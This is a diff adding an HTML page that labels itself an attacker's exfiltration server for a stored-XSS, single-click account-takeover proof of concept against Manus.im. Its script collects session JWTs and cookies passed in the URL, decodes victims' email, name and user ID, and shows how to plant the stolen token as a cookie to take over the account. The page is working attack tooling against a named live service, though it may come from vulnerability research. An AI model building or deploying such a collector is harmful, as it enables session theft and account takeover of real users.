@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Manus XSS - Stolen Session</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;padding:30px;min-height:100vh}
+h1{color:#ff3333;font-size:36px;text-align:center;margin:20px 0}
+h2{color:#ff6666;font-size:16px;text-align:center;margin-bottom:30px}
+.card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:25px;margin:20px auto;max-width:900px}
+.card h3{color:#ff4444;margin-bottom:15px;font-size:20px}
+.field{display:flex;margin:8px 0;border-bottom:1px solid #222;padding-bottom:8px;flex-wrap:wrap}
+.label{color:#ff6666;min-width:180px;font-weight:bold}
+.value{color:#00ff00;word-break:break-all;flex:1}
+.jwt-box{background:#001100;border:2px solid #00ff00;border-radius:4px;padding:15px;margin:15px 0}
+.jwt-box p{color:#00ff00;font-size:13px;word-break:break-all;line-height:1.8}
+.badge{display:inline-block;background:#ff0000;color:#fff;padding:3px 10px;border-radius:4px;font-size:12px;margin-left:10px}
+.waiting{text-align:center;color:#666;font-size:18px;margin:60px 0}
+.header{background:#1a0000;border:1px solid #ff3333;border-radius:8px;padding:15px;margin:0 auto 25px;max-width:900px;text-align:center}
+.count{font-size:48px;color:#ff3333;font-weight:bold}
+.decoded{background:#111;border:1px solid #444;border-radius:4px;padding:12px;margin:10px 0}
+.decoded p{color:#aaa;font-size:13px;margin:3px 0}
+.decoded span{color:#ffaa00}
+</style>
+</head>
+<body>
+<h1>ATTACKER'S EXFILTRATION SERVER</h1>
+<h2>Manus.im Stored XSS &rarr; Single-Click Account Takeover PoC</h2>
+
+<div class="header">
+  <div class="count" id="count">0</div>
+  <div style="color:#ff6666;margin-top:5px">Stolen Sessions</div>
+</div>
+
+<div id="results">
+  <div class="waiting" id="waiting">Waiting for victim to click the share link...</div>
+</div>
+
+<script>
+var params = new URLSearchParams(window.location.search);
+var jwt = params.get('session_id') || params.get('jwt') || params.get('v');
+var allCookies = params.get('c') || params.get('cookies') || '';
+
+if (jwt || allCookies) {
+  document.getElementById('waiting').style.display = 'none';
+  document.getElementById('count').textContent = '1';
+
+  var card = document.createElement('div');
+  card.className = 'card';
+
+  var html = '<h3>Victim #1 <span class="badge">SESSION STOLEN</span></h3>';
+
+  // Try to decode JWT payload
+  var decoded = {};
+  if (jwt) {
+    try {
+      var parts = jwt.split('.');
+      if (parts.length === 3) {
+        decoded = JSON.parse(atob(parts[1]));
+      }
+    } catch(e) {}
+  }
+
+  if (decoded.email) {
+    html += '<div class="field"><span class="label">Victim Email:</span><span class="value">' + decoded.email + '</span></div>';
+  }
+  if (decoded.name) {
+    html += '<div class="field"><span class="label">Victim Name:</span><span class="value">' + decoded.name + '</span></div>';
+  }
+  if (decoded.user_id) {
+    html += '<div class="field"><span class="label">User ID:</span><span class="value">' + decoded.user_id + '</span></div>';
+  }
+
+  html += '<div class="field"><span class="label">Origin:</span><span class="value">' + (params.get('o') || params.get('origin') || 'manus.im') + '</span></div>';
+  html += '<div class="field"><span class="label">Source Page:</span><span class="value">' + (params.get('h') || params.get('href') || 'shared slide link') + '</span></div>';
+
+  if (jwt) {
+    html += '<div class="field"><span class="label">JWT Length:</span><span class="value">' + jwt.length + ' characters</span></div>';
+    html += '<div class="jwt-box"><p><strong style="color:#ff4444">Stolen session_id JWT:</strong></p><p>' + jwt + '</p></div>';
+  }
+
+  if (allCookies) {
+    html += '<div class="field"><span class="label">All Cookies:</span><span class="value" style="font-size:12px">' + decodeURIComponent(allCookies) + '</span></div>';
+  }
+
+  if (decoded.exp) {
+    var expDate = new Date(decoded.exp * 1000);
+    html += '<div class="decoded">';
+    html += '<p><span>Token Expires:</span> ' + expDate.toISOString() + '</p>';
+    html += '<p><span>Token Type:</span> ' + (decoded.type || 'user') + '</p>';
+    if (decoded.jti) html += '<p><span>JTI:</span> ' + decoded.jti + '</p>';
+    html += '</div>';
+  }
+
+  html += '<div style="margin-top:15px;padding:10px;background:#220000;border-radius:4px;text-align:center">';
+  html += '<p style="color:#ff8888;font-size:14px">Attacker can now set this JWT as cookie on manus.im to fully takeover the victim\'s account.</p>';
+  html += '<p style="color:#ff6666;font-size:12px;margin-top:5px">document.cookie = "session_id=' + (jwt ? jwt.substring(0,30) + '..."' : 'STOLEN_JWT"') + '</p>';
+  html += '</div>';
+
+  card.innerHTML = html;
+  document.getElementById('results').appendChild(card);
+}
+</script>
+</body>
+</html>
